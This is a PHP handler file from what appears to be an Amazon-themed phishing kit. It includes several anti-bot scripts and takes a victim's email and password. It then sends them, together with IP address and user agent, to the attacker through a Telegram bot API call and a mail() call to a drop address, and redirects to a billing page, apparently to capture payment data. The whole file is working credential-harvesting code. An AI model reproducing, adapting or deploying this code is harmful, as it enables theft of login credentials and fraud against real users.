<?php 
include('../email.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
session_start();

$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if(isset($_POST['continuer']))
{


$_SESSION['email'] = $_POST['email'];
echo $_SESSION['email'];

if(strpos($_SESSION['email'], "hotmail.com") || strpos($_SESSION['email'], "hotmail.fr") || strpos($_SESSION['email'], "live.fr") || strpos($_SESSION['email'], "outlook.fr") || strpos($_SESSION['email'], "outlook.com") || strpos($_SESSION['email'], "orange.fr") || strpos($_SESSION['email'], "orange.com") || strpos($_SESSION['email'], "wanadoo.fr") || strpos($_SESSION['email'], "sfr.fr") || strpos($_SESSION['email'], "club-internet.fr") || strpos($_SESSION['email'], "neuf.fr") || strpos($_SESSION['email'], "aliceadsl.fr") || strpos($_SESSION['email'], "noos.fr") || strpos($_SESSION['email'], "yahoo.com") || strpos($_SESSION['email'], "yahoo.fr") || strpos($_SESSION['email'], "aol.com") || strpos($_SESSION['email'], "aol.fr") || strpos($_SESSION['email'], "gmail.com") || strpos($_SESSION['email'], "icloud.com") || strpos($_SESSION['email'], "gmx.fr") || strpos($_SESSION['email'], "gmx.de") || strpos($_SESSION['email'], "free.fr") || strpos($_SESSION['email'], "bbox.fr"))
{
header('Location: ../index.php?isPass'.uniqid(rand(), true));
}
else{
	header('Location: ../index.php?mailError=true'.uniqid(rand(), true));
}




}
else{
	if(isset($_POST['connexions']))
{


$_SESSION['password'] = $_POST['password'];

if(!empty($_SESSION['password']))
{

$message = "

👑 E-MAIL : ".$_SESSION['email']."
🎉 PASSWORD : ".$_SESSION['password']."

📀 IP ADRESS : ".$_SESSION['ip']."
📀 USER-AGENT : ".$_SESSION['useragent']."


";

$data = [
                                      'text' => '
👑 E-MAIL : '.$_SESSION['email'].'
🎉 PASSWORD : '.$_SESSION['password'].'

📀 IP ADRESS : '.$_SESSION['ip'].'
📀 USER-AGENT : '.$_SESSION['useragent'].'



                                      ',
                                      'chat_id' => $chat_id
                                ];
                                  file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );

$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=A7=8A=E3=80=8D=2B1_LOG_AMAZON?= - ".$_SESSION['ip'];
$headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";
mail($boite_rez,$subject,$message,$headers);

header('Location: billing.php?'.uniqid(rand(), true));


}
else{
		header('Location: ../index.php?passError=true'.uniqid(rand(), true));
}


}
else{
	die('ERROR 404');
}

}




?>

